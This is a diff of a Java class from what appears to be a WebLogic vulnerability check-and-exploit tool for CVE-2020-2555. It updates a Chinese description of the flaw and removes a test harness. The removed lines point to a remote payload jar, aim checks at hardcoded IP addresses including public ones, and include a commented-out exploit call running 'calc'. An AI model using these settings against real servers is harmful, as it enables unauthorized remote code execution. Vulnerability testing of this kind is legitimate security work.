@@ -33,7 +33,7 @@ import static com.weblogic.framework.utils.VersionUtils.getVersion;
  * Desc:
  * <p>
  *     CVE-2020-2555
- *     Oracle Fusion中间件Oracle Coherence存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取Weblogic服务器权限，执行任意命令。
+ *     Oracle Fusion 中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造 T3、IIOP 协议请求，获取 Weblogic 服务器权限，执行任意命令。
  *     该漏洞主要是因为 com.tangosol.util.filter.LimitFilter#toString 触发。
  *     漏洞影响版本:
  *     Oracle Coherence 3.7.1.17
@@ -100,17 +100,5 @@ public class CVE_2020_2555 implements VulTest{
     }
 
     public static void main(String[] args) throws Exception {
-//        String url = "http://192.168.1.6:8080/com.bea.javascript.jar";
-//        url = "http://192.168.1.3:9999/com.bea.javascript.jar";
-//        url = "http://45.32.23.211:8080/com.bea.javascript.jar";
-        String url = "http://123.139.243.246:8006/";
-        String javascriptUrl = "http://192.168.1.6:9999/com.bea.javascript.jar";
-        VulCheckParam vulCheckParam = new VulCheckParam();
-        vulCheckParam.setJavascriptUrl(javascriptUrl);
-        vulCheckParam.setProtocol("iiop");
-        CVE_2020_2555 vul = new CVE_2020_2555();
-        System.out.println(vul.vulnerable(url, vulCheckParam));
-//        vul.vulnerable("10.10.10.173", 7001, url);
-//        System.out.println(vul.exploit(null,null,"calc"));
     }
 }
